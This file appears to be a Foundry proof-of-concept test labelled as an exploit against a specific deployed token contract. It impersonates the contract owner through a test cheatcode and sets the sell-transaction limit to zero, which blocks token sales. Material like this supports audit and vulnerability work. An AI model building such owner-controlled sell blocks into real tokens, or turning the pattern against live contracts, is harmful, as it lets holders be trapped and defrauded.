// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Ilsl {
    function getOwner() external view returns (address);
    function setSellTxLimitInPercent(uint256 maxSellTxPercent) external;
    function _maxSellTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;
    address attacker = address(this);
    Ilsl public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Ilsl(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // 1. Fetch the owner of the contract
        address owner = target.getOwner();
        vm.label(owner, "Contract Owner");

        // 2. Impersonate the owner to gain authorized privileges
        vm.startPrank(owner);

        // 3. Call the vulnerable function to set the sell limit to 0%
        target.setSellTxLimitInPercent(0);

        // 4. Stop impersonating the owner
        vm.stopPrank();

        // 5. Verify that the max sell amount is now 0
        assertEq(target._maxSellTxAmount(), 0);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
